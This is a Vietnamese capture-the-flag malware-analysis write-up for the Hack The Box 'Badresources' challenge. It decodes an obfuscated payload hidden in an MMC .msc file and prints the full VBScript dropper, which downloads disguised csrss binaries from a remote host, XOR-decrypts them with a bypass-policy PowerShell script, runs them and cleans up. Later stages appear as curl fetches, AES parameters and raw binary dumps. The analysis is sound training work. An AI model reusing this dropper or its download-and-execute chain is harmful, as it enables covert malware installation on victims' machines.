# Binary Badresources-htb-med

![image.png](Binary%20Badresources-htb-med/image.png)

Bài này đề cho chúng ta 1 file msc sau khi mà đọc nó dưới dạng text thì phát hiện nó bị obfuscate

![image.png](Binary%20Badresources-htb-med/image%201.png)

Đoạn này **lộn xộn vì nó là payload JavaScript bị obfuscate nhét  một file MMC `.msc`**.

Mục tiêu có vẻ là:

- giấu code thật trong `StringTable`
- decode bằng `unescape`
- dựng XML/XSL
- rồi dùng `eval(...)` / `transformNode(...)` để thực thi

Nó **không giống file console quản trị bình thường**, mà giống **file `.msc` độc hại / exploit / lure file** hơn.

Tiếp mình sẽ decode 

```python
var scopeNamespace = external.Document.ScopeNamespace;
var rootNode = scopeNamespace.GetRoot();
var mainNode = scopeNamespace.GetChild(rootNode);
var docNode = scopeNamespace.GetNext(mainNode);
external.Document.ActiveView.ActiveScopeNode = docNode;
docObject = external.Document.ActiveView.ControlObject;
external.Document.ActiveView.ActiveScopeNode = mainNode;
docObject.async = false;
docObject.loadXML(unescape("%3C%3Fxml%20version%3D%271%2E0%27%3F%3E%0D%0A%3Cstylesheet%0D%0A%20%20%20%20xmlns%3D%22http%3A%2F%2Fwww%2Ew3%2Eorg%2F1999%2FXSL%2FTransform%22%20xmlns%3Ams%3D%22urn%3Aschemas%2Dmicrosoft%2Dcom%3Axslt%22%0D%0A%20%20%20%20xmlns%3Auser%3D%22placeholder%22%0D%0A%20%20%20%20version%3D%221%2E0%22%3E%0D%0A%20%20%20%20%3Coutput%20method%3D%22text%22%2F%3E%0D%0A%20%20%20%20%3Cms%3Ascript%20implements%2Dprefix%3D%22user%22%20language%3D%22VBScript%22%3E%0D%0A%20%20%20%20%3C%21%5BCDATA%5B%0D%0ATpHCM%20%3D%20%22%22%3Afor%20i%20%3D%201%20to%203222%3A%20TpHCM%20%3D%20TpHCM%20%2B%20chr%28Asc%28mid%28%22Stxmsr%24I%7Ctpmgmx%0EHmq%24sfnWlipp0%24sfnJWS0%24sfnLXXT%0EHmq%24wxvYVP50%24wxvYVP60%24wxvYVP70%24wxvWls%7BjmpiYVP%0EHmq%24wxvHs%7BrpsehTexl50%24wxvHs%7BrpsehTexl60%24wxvHs%7BrpsehTexl70%24wxvWls%7BjmpiTexl%0EHmq%24wxvI%7CigyxefpiTexl0%24wxvTs%7BivWlippWgvmtx%0EwxvYVP5%24A%24%26lxxt%3E33%7Bmrhs%7Bwythexi2lxf3gwvww2i%7Ci%26%0EwxvYVP6%24A%24%26lxxt%3E33%7Bmrhs%7Bwythexi2lxf3gwvww2hpp%26%0EwxvYVP7%24A%24%26lxxt%3E33%7Bmrhs%7Bwythexi2lxf3gwvww2i%7Ci2gsrjmk%26%0EwxvWls%7BjmpiYVP%24A%24%26lxxt%3E33%7Bmrhs%7Bwythexi2lxf3%7Berxih2thj%26%0EwxvHs%7BrpsehTexl5%24A%24%26G%3E%60Ywivw%60Tyfpmg%60gwvww2i%7Ci%26%0EwxvHs%7BrpsehTexl6%24A%24%26G%3E%60Ywivw%60Tyfpmg%60gwvww2hpp%26%0EwxvHs%7BrpsehTexl7%24A%24%26G%3E%60Ywivw%60Tyfpmg%60gwvww2i%7Ci2gsrjmk%26%0EwxvWls%7BjmpiTexl%24A%24%26G%3E%60Ywivw%60Tyfpmg%60%7Berxih2thj%26%0EwxvI%7CigyxefpiTexl%24A%24%26G%3E%60Ywivw%60Tyfpmg%60gwvww2i%7Ci%26%0E%0EWix%24sfnWlipp%24A%24GviexiSfnigx%2C%26%5BWgvmtx2Wlipp%26%2D%0EWix%24sfnJWS%24A%24GviexiSfnigx%2C%26Wgvmtxmrk2JmpiW%7DwxiqSfnigx%26%2D%0EWix%24sfnLXXT%24A%24GviexiSfnigx%2C%26QW%5CQP62%5CQPLXXT%26%2D%0E%0EMj%24Rsx%24sfnJWS2JmpiI%7Cmwxw%2CwxvHs%7BrpsehTexl5%2D%24Xlir%0E%24%24%24%24Hs%7BrpsehJmpi%24wxvYVP50%24wxvHs%7BrpsehTexl5%0EIrh%24Mj%0EMj%24Rsx%24sfnJWS2JmpiI%7Cmwxw%2CwxvHs%7BrpsehTexl6%2D%24Xlir%0E%24%24%24%24Hs%7BrpsehJmpi%24wxvYVP60%24wxvHs%7BrpsehTexl6%0EIrh%24Mj%0EMj%24Rsx%24sfnJWS2JmpiI%7Cmwxw%2CwxvHs%7BrpsehTexl7%2D%24Xlir%0E%24%24%24%24Hs%7BrpsehJmpi%24wxvYVP70%24wxvHs%7BrpsehTexl7%0EIrh%24Mj%0EMj%24Rsx%24sfnJWS2JmpiI%7Cmwxw%2CwxvWls%7BjmpiTexl%2D%24Xlir%0E%24%24%24%24Hs%7BrpsehJmpi%24wxvWls%7BjmpiYVP0%24wxvWls%7BjmpiTexl%0EIrh%24Mj%0E%0EwxvTs%7BivWlippWgvmtx%24A%24c%0E%26teveq%24%2C%26%24%2A%24zfGvPj%24%2A%24c%0E%26%24%24%24%24%5Fwxvmrka%28JmpiTexl0%26%24%2A%24zfGvPj%24%2A%24c%0E%26%24%24%24%24%5Fwxvmrka%28Oi%7DTexl%26%24%2A%24zfGvPj%24%2A%24c%0E%26%2D%26%24%2A%24zfGvPj%24%2A%24c%0E%26%28oi%7D%24A%24%5FW%7Dwxiq2MS2Jmpia%3E%3EViehEppF%7Dxiw%2C%28Oi%7DTexl%2D%26%24%2A%24zfGvPj%24%2A%24c%0E%26%28jmpiGsrxirx%24A%24%5FW%7Dwxiq2MS2Jmpia%3E%3EViehEppF%7Dxiw%2C%28JmpiTexl%2D%26%24%2A%24zfGvPj%24%2A%24c%0E%26%28oi%7DPirkxl%24A%24%28oi%7D2Pirkxl%26%24%2A%24zfGvPj%24%2A%24c%0E%26jsv%24%2C%28m%24A%244%3F%24%28m%241px%24%28jmpiGsrxirx2Pirkxl%3F%24%28m%2F%2F%2D%24%7F%26%24%2A%24zfGvPj%24%2A%24c%0E%26%24%24%24%24%28jmpiGsrxirx%5F%28ma%24A%24%28jmpiGsrxirx%5F%28ma%241f%7Csv%24%28oi%7D%5F%28m%24%29%24%28oi%7DPirkxla%26%24%2A%24zfGvPj%24%2A%24c%0E%26%C2%81%26%24%2A%24zfGvPj%24%2A%24c%0E%26%5FW%7Dwxiq2MS2Jmpia%3E%3E%5BvmxiEppF%7Dxiw%2C%28JmpiTexl0%24%28jmpiGsrxirx%2D%26%24%2A%24zfGvPj%0E%0EHmq%24sfnJmpi%0ESr%24Ivvsv%24Viwyqi%24Ri%7Cx%0EWix%24sfnJmpi%24A%24sfnJWS2GviexiXi%7CxJmpi%2C%26G%3E%60Ywivw%60Tyfpmg%60xiqt2tw5%260%24Xvyi%2D%0EMj%24Ivv2Ryqfiv%24%40B%244%24Xlir%0E%24%24%24%24%5BWgvmtx2Igls%24%26Ivvsv%24gviexmrk%24Ts%7BivWlipp%24wgvmtx%24jmpi%3E%24%26%24%2A%24Ivv2Hiwgvmtxmsr%0E%24%24%24%24%5BWgvmtx2Uymx%0EIrh%24Mj%0EsfnJmpi2%5BvmxiPmri%24wxvTs%7BivWlippWgvmtx%0EsfnJmpi2Gpswi%0E%0EHmq%24evvJmpiTexlw%0EevvJmpiTexlw%24A%24Evve%7D%2CwxvHs%7BrpsehTexl50%24wxvHs%7BrpsehTexl70%24wxvWls%7BjmpiTexl%2D%0E%0EHmq%24m%0EJsv%24m%24A%244%24Xs%24YFsyrh%2CevvJmpiTexlw%2D%0E%24%24%24%24Hmq%24mrxVixyvrGshi%0E%24%24%24%24mrxVixyvrGshi%24A%24sfnWlipp2Vyr%2C%26ts%7Bivwlipp%241I%7CigyxmsrTspmg%7D%24F%7Dteww%241Jmpi%24G%3E%60Ywivw%60Tyfpmg%60xiqt2tw5%241JmpiTexl%24%26%24%2A%24Glv%2C78%2D%24%2A%24evvJmpiTexlw%2Cm%2D%24%2A%24Glv%2C78%2D%24%2A%24%26%241Oi%7DTexl%24%26%24%2A%24Glv%2C78%2D%24%2A%24wxvHs%7BrpsehTexl6%24%2A%24Glv%2C78%2D0%2440%24Xvyi%2D%0E%24%24%24%24%0E%24%24%24%24Mj%24mrxVixyvrGshi%24%40B%244%24Xlir%0E%24%24%24%24%24%24%24%24%5BWgvmtx2Igls%24%26Ts%7BivWlipp%24wgvmtx%24i%7Cigyxmsr%24jempih%24jsv%24%26%24%2A%24evvJmpiTexlw%2Cm%2D%24%2A%24%26%24%7Bmxl%24i%7Cmx%24gshi%3E%24%26%24%2A%24mrxVixyvrGshi%0E%24%24%24%24Irh%24Mj%0ERi%7Cx%0E%0EsfnWlipp2Vyr%24wxvI%7CigyxefpiTexl0%2450%24Xvyi%0EsfnWlipp2Vyr%24wxvWls%7BjmpiTexl0%2450%24Xvyi%0EsfnJWS2HipixiJmpi%24%26G%3E%60Ywivw%60Tyfpmg%60gwvww2hpp%26%0EsfnJWS2HipixiJmpi%24%26G%3E%60Ywivw%60Tyfpmg%60gwvww2i%7Ci%26%0EsfnJWS2HipixiJmpi%24%26G%3E%60Ywivw%60Tyfpmg%60gwvww2i%7Ci2gsrjmk%26%0EsfnJWS2HipixiJmpi%24%26G%3E%60Ywivw%60Tyfpmg%60xiqt2tw5%26%0E%0EWyf%24Hs%7BrpsehJmpi%2Cyvp0%24texl%2D%0E%24%24%24%24Hmq%24sfnWxvieq%0E%24%24%24%24Wix%24sfnWxvieq%24A%24GviexiSfnigx%2C%26EHSHF2Wxvieq%26%2D%0E%24%24%24%24sfnLXXT2Stir%24%26KIX%260%24yvp0%24Jepwi%0E%24%24%24%24sfnLXXT2Wirh%0E%24%24%24%24Mj%24sfnLXXT2Wxexyw%24A%24644%24Xlir%0E%24%24%24%24%24%24%24%24sfnWxvieq2Stir%0E%24%24%24%24%24%24%24%24sfnWxvieq2X%7Dti%24A%245%0E%24%24%24%24%24%24%24%24sfnWxvieq2%5Bvmxi%24sfnLXXT2ViwtsrwiFsh%7D%0E%24%24%24%24%24%24%24%24sfnWxvieq2WeziXsJmpi%24texl0%246%0E%24%24%24%24%24%24%24%24sfnWxvieq2Gpswi%0E%24%24%24%24Irh%24Mj%0E%24%24%24%24Wix%24sfnWxvieq%24A%24Rsxlmrk%0EIrh%24Wyf%0E%22%2Ci%2C1%29%29%20%2D%20%285%29%20%2B%20%281%29%29%3ANext%3AExecute%20TpHCM%3A%0D%0A%20%20%20%20%5D%5D%3E%0D%0A%20%20%20%20%3C%2Fms%3Ascript%3E%0D%0A%3C%2Fstylesheet%3E"));
docObject.transformNode(docObject);
```

Sau khi decode xong thì mình thấy trong unescape có vẻ như là 1 url encode nên mình sẽ lên cyberchef decode tiếp

![image.png](Binary%20Badresources-htb-med/image%202.png)

Đây là lớp obfuscation tiếp theo.

Nghĩa là:

- lấy từng ký tự trong chuỗi dài
- **trừ 4** khỏi mã ASCII của mỗi ký tự
- ghép lại thành script thật
- rồi `Execute` script đó

Tức là inner payload vẫn chưa phải plain text hoàn toàn, nhưng giờ bóc rất dễ.

```python
ma = "Stxmsr$I|tpmgmxHmq$sfnWlipp0$sfnJWS0$sfnLXXTHmq$wxvYVP50$wxvYVP60$wxvYVP70$wxvWls{jmpiYVPHmq$wxvHs{rpsehTexl50$wxvHs{rpsehTexl60$wxvHs{rpsehTexl70$wxvWls{jmpiTexlHmq$wxvI|igyxefpiTexl0$wxvTs{ivWlippWgvmtxwxvYVP5$A$&lxxt>33{mrhs{wythexi2lxf3gwvww2i|i&wxvYVP6$A$&lxxt>33{mrhs{wythexi2lxf3gwvww2hpp&wxvYVP7$A$&lxxt>33{mrhs{wythexi2lxf3gwvww2i|i2gsrjmk&wxvWls{jmpiYVP$A$&lxxt>33{mrhs{wythexi2lxf3{erxih2thj&wxvHs{rpsehTexl5$A$&G>`Ywivw`Tyfpmg`gwvww2i|i&wxvHs{rpsehTexl6$A$&G>`Ywivw`Tyfpmg`gwvww2hpp&wxvHs{rpsehTexl7$A$&G>`Ywivw`Tyfpmg`gwvww2i|i2gsrjmk&wxvWls{jmpiTexl$A$&G>`Ywivw`Tyfpmg`{erxih2thj&wxvI|igyxefpiTexl$A$&G>`Ywivw`Tyfpmg`gwvww2i|i&Wix$sfnWlipp$A$GviexiSfnigx,&[Wgvmtx2Wlipp&-Wix$sfnJWS$A$GviexiSfnigx,&Wgvmtxmrk2JmpiW}wxiqSfnigx&-Wix$sfnLXXT$A$GviexiSfnigx,&QW\QP62\QPLXXT&-Mj$Rsx$sfnJWS2JmpiI|mwxw,wxvHs{rpsehTexl5-$Xlir$$$$Hs{rpsehJmpi$wxvYVP50$wxvHs{rpsehTexl5Irh$MjMj$Rsx$sfnJWS2JmpiI|mwxw,wxvHs{rpsehTexl6-$Xlir$$$$Hs{rpsehJmpi$wxvYVP60$wxvHs{rpsehTexl6Irh$MjMj$Rsx$sfnJWS2JmpiI|mwxw,wxvHs{rpsehTexl7-$Xlir$$$$Hs{rpsehJmpi$wxvYVP70$wxvHs{rpsehTexl7Irh$MjMj$Rsx$sfnJWS2JmpiI|mwxw,wxvWls{jmpiTexl-$Xlir$$$$Hs{rpsehJmpi$wxvWls{jmpiYVP0$wxvWls{jmpiTexlIrh$MjwxvTs{ivWlippWgvmtx$A$c&teveq$,&$*$zfGvPj$*$c&$$$$_wxvmrka(JmpiTexl0&$*$zfGvPj$*$c&$$$$_wxvmrka(Oi}Texl&$*$zfGvPj$*$c&-&$*$zfGvPj$*$c&(oi}$A$_W}wxiq2MS2Jmpia>>ViehEppF}xiw,(Oi}Texl-&$*$zfGvPj$*$c&(jmpiGsrxirx$A$_W}wxiq2MS2Jmpia>>ViehEppF}xiw,(JmpiTexl-&$*$zfGvPj$*$c&(oi}Pirkxl$A$(oi}2Pirkxl&$*$zfGvPj$*$c&jsv$,(m$A$4?$(m$1px$(jmpiGsrxirx2Pirkxl?$(m//-$&$*$zfGvPj$*$c&$$$$(jmpiGsrxirx_(ma$A$(jmpiGsrxirx_(ma$1f|sv$(oi}_(m$)$(oi}Pirkxla&$*$zfGvPj$*$c&&$*$zfGvPj$*$c&_W}wxiq2MS2Jmpia>>[vmxiEppF}xiw,(JmpiTexl0$(jmpiGsrxirx-&$*$zfGvPjHmq$sfnJmpiSr$Ivvsv$Viwyqi$Ri|xWix$sfnJmpi$A$sfnJWS2GviexiXi|xJmpi,&G>`Ywivw`Tyfpmg`xiqt2tw5&0$Xvyi-Mj$Ivv2Ryqfiv$@B$4$Xlir$$$$[Wgvmtx2Igls$&Ivvsv$gviexmrk$Ts{ivWlipp$wgvmtx$jmpi>$&$*$Ivv2Hiwgvmtxmsr$$$$[Wgvmtx2UymxIrh$MjsfnJmpi2[vmxiPmri$wxvTs{ivWlippWgvmtxsfnJmpi2GpswiHmq$evvJmpiTexlwevvJmpiTexlw$A$Evve},wxvHs{rpsehTexl50$wxvHs{rpsehTexl70$wxvWls{jmpiTexl-Hmq$mJsv$m$A$4$Xs$YFsyrh,evvJmpiTexlw-$$$$Hmq$mrxVixyvrGshi$$$$mrxVixyvrGshi$A$sfnWlipp2Vyr,&ts{ivwlipp$1I|igyxmsrTspmg}$F}teww$1Jmpi$G>`Ywivw`Tyfpmg`xiqt2tw5$1JmpiTexl$&$*$Glv,78-$*$evvJmpiTexlw,m-$*$Glv,78-$*$&$1Oi}Texl$&$*$Glv,78-$*$wxvHs{rpsehTexl6$*$Glv,78-0$40$Xvyi-$$$$$$$$Mj$mrxVixyvrGshi$@B$4$Xlir$$$$$$$$[Wgvmtx2Igls$&Ts{ivWlipp$wgvmtx$i|igyxmsr$jempih$jsv$&$*$evvJmpiTexlw,m-$*$&${mxl$i|mx$gshi>$&$*$mrxVixyvrGshi$$$$Irh$MjRi|xsfnWlipp2Vyr$wxvI|igyxefpiTexl0$50$XvyisfnWlipp2Vyr$wxvWls{jmpiTexl0$50$XvyisfnJWS2HipixiJmpi$&G>`Ywivw`Tyfpmg`gwvww2hpp&sfnJWS2HipixiJmpi$&G>`Ywivw`Tyfpmg`gwvww2i|i&sfnJWS2HipixiJmpi$&G>`Ywivw`Tyfpmg`gwvww2i|i2gsrjmk&sfnJWS2HipixiJmpi$&G>`Ywivw`Tyfpmg`xiqt2tw5&Wyf$Hs{rpsehJmpi,yvp0$texl-$$$$Hmq$sfnWxvieq$$$$Wix$sfnWxvieq$A$GviexiSfnigx,&EHSHF2Wxvieq&-$$$$sfnLXXT2Stir$&KIX&0$yvp0$Jepwi$$$$sfnLXXT2Wirh$$$$Mj$sfnLXXT2Wxexyw$A$644$Xlir$$$$$$$$sfnWxvieq2Stir$$$$$$$$sfnWxvieq2X}ti$A$5$$$$$$$$sfnWxvieq2[vmxi$sfnLXXT2ViwtsrwiFsh}$$$$$$$$sfnWxvieq2WeziXsJmpi$texl0$6$$$$$$$$sfnWxvieq2Gpswi$$$$Irh$Mj$$$$Wix$sfnWxvieq$A$RsxlmrkIrh$Wyf"

stri = ""

for i in range(1, len(ma) + 1):
    char = chr(ord(ma[i - 1]) - 5 + 1) 
    stri += char

print(stri)
```

```python
Option Explicit
Dim objShell, objFSO, objHTTP
Dim strURL1, strURL2, strURL3, strShowfileURL
Dim strDownloadPath1, strDownloadPath2, strDownloadPath3, strShowfilePath
Dim strExecutablePath, strPowerShellScript
strURL1 = "http://windowsupdate.htb/csrss.exe"
strURL2 = "http://windowsupdate.htb/csrss.dll"
strURL3 = "http://windowsupdate.htb/csrss.exe.config"
strShowfileURL = "http://windowsupdate.htb/wanted.pdf"
strDownloadPath1 = "C:\Users\Public\csrss.exe"
strDownloadPath2 = "C:\Users\Public\csrss.dll"
strDownloadPath3 = "C:\Users\Public\csrss.exe.config"
strShowfilePath = "C:\Users\Public\wanted.pdf"
strExecutablePath = "C:\Users\Public\csrss.exe"

Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objHTTP = CreateObject("MSXML2.XMLHTTP")

If Not objFSO.FileExists(strDownloadPath1) Then
    DownloadFile strURL1, strDownloadPath1
End If
If Not objFSO.FileExists(strDownloadPath2) Then
    DownloadFile strURL2, strDownloadPath2
End If
If Not objFSO.FileExists(strDownloadPath3) Then
    DownloadFile strURL3, strDownloadPath3
End If
If Not objFSO.FileExists(strShowfilePath) Then
    DownloadFile strShowfileURL, strShowfilePath
End If

strPowerShellScript = _
"param (" & vbCrLf & _
"    [string]$FilePath," & vbCrLf & _
"    [string]$KeyPath" & vbCrLf & _
")" & vbCrLf & _
"$key = [System.IO.File]::ReadAllBytes($KeyPath)" & vbCrLf & _
"$fileContent = [System.IO.File]::ReadAllBytes($FilePath)" & vbCrLf & _
"$keyLength = $key.Length" & vbCrLf & _
"for ($i = 0; $i -lt $fileContent.Length; $i++) {" & vbCrLf & _
"    $fileContent[$i] = $fileContent[$i] -bxor $key[$i % $keyLength]" & vbCrLf & _
"}" & vbCrLf & _
"[System.IO.File]::WriteAllBytes($FilePath, $fileContent)" & vbCrLf

Dim objFile
On Error Resume Next
Set objFile = objFSO.CreateTextFile("C:\Users\Public\temp.ps1", True)
If Err.Number <> 0 Then
    WScript.Echo "Error creating PowerShell script file: " & Err.Description
    WScript.Quit
End If
objFile.WriteLine strPowerShellScript
objFile.Close

Dim arrFilePaths
arrFilePaths = Array(strDownloadPath1, strDownloadPath3, strShowfilePath)

Dim i
For i = 0 To UBound(arrFilePaths)
    Dim intReturnCode
    intReturnCode = objShell.Run("powershell -ExecutionPolicy Bypass -File C:\Users\Public\temp.ps1 -FilePath " & Chr(34) & arrFilePaths(i) & Chr(34) & " -KeyPath " & Chr(34) & strDownloadPath2 & Chr(34), 0, True)

    If intReturnCode <> 0 Then
        WScript.Echo "PowerShell script execution failed for " & arrFilePaths(i) & " with exit code: " & intReturnCode
    End If
Next

objShell.Run strExecutablePath, 1, True
objShell.Run strShowfilePath, 1, True
objFSO.DeleteFile "C:\Users\Public\csrss.dll"
objFSO.DeleteFile "C:\Users\Public\csrss.exe"
objFSO.DeleteFile "C:\Users\Public\csrss.exe.config"
objFSO.DeleteFile "C:\Users\Public\temp.ps1"

Sub DownloadFile(url, path)
    Dim objStream
    Set objStream = CreateObject("ADODB.Stream")
    objHTTP.Open "GET", url, False
    objHTTP.Send
    If objHTTP.Status = 200 Then
        objStream.Open
        objStream.Type = 1
        objStream.Write objHTTP.ResponseBody
        objStream.SaveToFile path, 2
        objStream.Close
    End If
    Set objStream = Nothing
End Sub
```

 Ở đây mọi người thấy là 

- hacker tải 4 file:
    - `csrss.exe`
    - `csrss.dll`
    - `csrss.exe.config`
    - `wanted.pdf`
- Sau đó dùng **`csrss.dll` làm XOR key** để encrypt:
    - `csrss.exe`
    - `csrss.exe.config`
    - `wanted.pdf`

 Giờ tiếp mình sẽ tải các file thông quan link và ip:port mà htb cung cấp và tiến hành  xor decrypt

![image.png](Binary%20Badresources-htb-med/image%203.png)

Tiếp ở đây thì mình có thấy thêm file json mình sẽ tải về xem sao

```python
➜  hackthebox curl -H 'Host: windowsupdate.htb' \
'http://154.57.164.79:31874/5f8f9e33bb5e13848af2622b66b2308c.json' \
-o stage.json
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  6656 100  6656   0     0 10886     0  --:--:-- --:--:-- --:--:-- 10893
➜  hackthebox cat stage.json
MZ����@��� �!�L�!This program cannot be run in DOS mode.
$PEdޱf�"

          � `}@�@@ @� H.text�  `.rsrc�@@@HH#d   H ��~%-&~�s
%�(
o
*(
*n(
(       r�p~
o
�*($
*␦(*0b(

 `(

rps

(%�i
~

 0@(
    (
~

~
```

Sau khi tải về và đọc thì mình thấy nó lại có vẻ như là 1 file thực thi, mình sẽ lên die xem

![image.png](Binary%20Badresources-htb-med/image%204.png)

Đây là 1 file pe64 được viết bằng c# nên mình sẽ mở nó bằng dnspy xem sao

![image.png](Binary%20Badresources-htb-med/image%205.png)

Trong hàm này mọi người sẽ thấy có mã hóa aes với 

ciphertext: ZzfccaKJB3CrDvOnj/6io5OR7jZGL0pr0sLO/ZcRNSa1JLrHA+k2RN1QkelHxKVvhrtiCDD14Aaxc266kJOzF59MfhoI5hJjc5hx7kvGAFw=

key: vudzvuokmioomyialpkyydvgqdmdkdxy

key thì sẽ được chuyern thành sha256 khi decode

iv: tbbliftalildywic

![image.png](Binary%20Badresources-htb-med/image%206.png)

Sau khi decode tiếp tục chúng ta nhận được file .xml mình sẽ tải nó về và đọc thử

```python
➜  hackthebox curl -H 'Host: windowsupdate.htb' \
'http://154.57.164.79:31874/ec285935b46229d40b95438707a7efb2282f2f02.xml'
@USVWATAUAVAWH��$(���H��  H���  �h  H�M��   H���    HH���   A�@�I�H�A�@�I�H�A�@�I�H�A�I�H��u� A�  H@ IH0A @@H�@PI0A@H�APH���  �
                                                                                                                                 3�H���  A�   �
                                                                                                                                                 3�ǅ     H�D$`��  H�D$PA�   �L$H��L$@D�A �L$8�L$0�L$(�L$ ��  H��  fǅ   ���   ��t)H�T$`L��  3����   ��u���   H�L$`���   H��  H���  ���   H�uXH���  ��t"H���  �փ�  uH�W  H���  �H�S  ��3�H���  A�  �
]  H�D$(H�T$hH�L$ A�@  H�}h�   ��H��p  ǅp  @   L�����   H��x  H�p  H��L�
   H�M���  3�H���  A�  �/
K  L����H��H��H��H��H��H�J�׹   H����H���  H����L��H���  I���tH���  H�L$x��H�]`H���  ��H��H���������H��H��H��H��H�J��H���  L����H��H��H��H��H��H�J��H�L$xL����H��H��H��H��H��H�J��H�
                                                               H���  ��L��H���  I���Y
                                                                                       H�L$x��L��H�T$xI���B
�  ��L��H��  H���'                                                                                           H�
                    H�L$h��L��H�T$hH���
[  L�l$ A�  H���  H�M���H����H����3�H���  A�  �  L�
\  �                      I����3�Hǅ      A�  H���  E3�  L���   L�mpL�} f�E���Q  A��u�H�E�H�D$0L���  H��  H�D$(L��  H��  �D$   � H�
      ���G  H��  H��  H��A��H�υ�u��  A� @  A�ֹ�  A���t���H��  A�Յ�u��  A� @  H��A��3���0  �G�����  A�   ��A�   3��U�H��H��H���P  A� @  ��H��A��A�@   A�   ��3��U�D��H��H��H���U8A� @  ��H��A��3�E3  �8$(L��3҉\$ 3����   H�Ⱥ�������   A� @  ��H��A������H�E�H�D$0L���  H��  H�D$(L��  H��  �D$   � H�
{  A�  H�\$ H���  H�M��  A�ֹ�  A���A���H��  L�
  H����H�躇�-H�D$PI��L�(L�xH�L�`H�p L�p(H�x0H�h8�t  H�L$P�Q�o�H���   H���[  H�\$P����kI��H���   �B  �Z~p�H���   I���.  ���\H�CxI���  �3���H���   I���     �|�{H���   I����  �G��.H���   I����  �ͽH���   I���i  �^��H���   I���U  ����H���   H���A  �Ær�H���   H���-  ����H�ChI���  ��\H�CHI���
                                                                                               �4�M�H�CpI����  ����XH�CPI����  �
s@
��H��@  I���  ����H��H  I����  ���|H���  I����  ���2SH��P  I����  �PC�SH��X  I����  �a�GH��`  I���  �t��H��h  I���  �ԫ��H��p  I���  �9␦��H��x  I���s  ��d�[H���  I���_  �p$�H���  I���K  �{
�H���  I���7  ����FH���  I���#  �ʖ�H���  I���  �6�,H���  I����   �SD�H���  I����   �p��YH���  I����   ��en�H���   I���   H���  H��H�\$XH�l$`H�t$hH�� A_A^A]A\_���������H�\H�l$H�t$H�|$ AVH�� eH�%0   D��H�P`H�BH�P H�2H�^�H��H93tH�H�O`�  A;�t*H�;�tH93u�3�H�\$0H�l$8H�t$@H�|$HH�� A^�H�G0���������������H�\H�l$H�t$WATAUAVAWH�� HcA<3�D��H� �   H�D�fD�v L�D�n$L�L�9^v#@ ��A�
                                                                                                                                                                             �H�  A;�t*f����;Fr�3�H�\$PH�l$XH�t$`H�� A_A^A]A\_�A�D} A��H������H�L��M��tH�<$H��I�����H�<$I��H�����������@UH�l$�H��   L���$@@@@L���D$@@@@�D@@@@L���D$
                                                                                                                                  @@@@�D$@@@@�D$@@@@�D$@@@@�D$@@@@�D$ @@@@�D$$@@@@�D$(@@@>�E�@@@?�E�4567�E�89:;�E�<=@@�E�@@@@�E�@ �E��E�
�E�

�E��E��E�@�E�@@@@�E�@␦E� �E�!"#$�E�%&'(�E�)*+,�E�-./0�E�123@�E�@@@@�E�@@@@�E�@@@@�E�@@@@�E�@@@@�E�@@@@�E�@@@@�E�@@@@�E�@@@@�E�@@@@�E�@@@@�E�@@@@�E@@@@�E@@@@�E
                                                                                                                                                              @@@@�E@@@@�E@@@@�E@@@@�E@@@�E@@@@�E#@@@@�E'@@@@�E+@@@@�E/@@@@�E3@@@@�E7@@@@�E;@@@@�E?@@@@�EC@@@@�EG@@@@�EK@@@@�EO@@@@�ES@@@@A� I���<?v�D+�A��A�@������D�@A����   A�@�H��$  ��������E���     A��A�B���
                                                                                                                                                                  ��
�A�A�B�A�B���
             ��
�A�QA�B�
        A�BI����

A�II��H��u�H��$  A��~A�B�A����
                              ��
�A�I��A��~ A�B�A�B���
                     ��
�A�I��A��~␦A�BA�J���

A�I��A��A� A��E+�A��H��   ]����H�\H�t$H�|$A�@�E3�H�H�5�  H��H��L��H����   L�P�H���������L�ZI��H��H��D�RA�C�M�[H���0A�I�C�A�K���H��H��H
                                                                                                                                      ��1A�AI�K�A�C���H��H��H
                                                                                                                                                             ��1A�AI�C���?�0A�AI��H��u�E;�}lIc��␦H���0A�A�@�D;�uH�␦�=��H���A�A�-H�
                                 ␦�D��H��H��H
                                             ��1A�AH�D���
                                                         �A�IA�A=I��H�\H�t$A� D+�H�|$A�A�������L�L$ SH�� H���  I��M��L�L$PL��L��I��I����H�� [�H�\$H�l$ L�D$VWATAUAVH��`  H��$�  H��H��I��L��H��� 4  3�E3�E3��|$ 3�A��L��H�������$�  A�   L�S`��A�   �D$D   3�A��D��3�H��L�����   L�SHH�
  H��X  A��  H�|$8E3ɉ|$0H���D$(   I��H�|$ L��$�  ��L��H��uI����`  �  H��h  H�=  H�|$8E3��D$0  L��H�|$(I��H�|$ ��H��H���f  H��p  L�D$DA�   H��A�Q�H�ͅ��:  H��x  H�T$PA�    A������Ѕ��  H�L$HM��H���  E3��L$ 3�H���Ѕ���   �|$@D���    H���  H��$�  E3ɉ�$�  E3�H���Ѕ���   D��$�  E��t)L�SXL�L$@E�H��A��A+�I�A�҅���   9|$@w�H�C`A�   A�   A��3���E��3�H��H�����   E��I��H�����   H��$�  �  � A� @  I��H�8H��$�  D�0��  H����`  I����`  I����`  �   �H����`  I����`  I����`  3�L��$�  L��$`  I�[8I�kHI��A^A]A\_^��������������D� L�Q�  E��t1@ ff�     A�Q���E�A M�REG�E�J�k�!A�E��u��������������D�      L�Q�  E��t1@ ff�     A�Q���E�A M�REG�E�J�k�!A�E��u��msvcrt.dll �kernelbase.dll �Shlwapi.dll Wininet.dll Winmm.dll ��Advapi32.dll ���api.s2cloud-amazon.com                                          x64 %s&&%s&&%s&&%s&&%s �%d%s ���GB �/common/oauth2/authorize?client_id=%s ��{"user":"HTB{mSc_1s_b31n9_s3r10u5ly_4buSed}"}    /api/v1/homepage/%s NULL ���404 Not Found! �(isAdmin) ��(unknow) ���Content-Length: %lu

 Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36                 POST ���ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/ 
```

HTB{mSc_1s_b31n9_s3r10u5ly_4buSed}
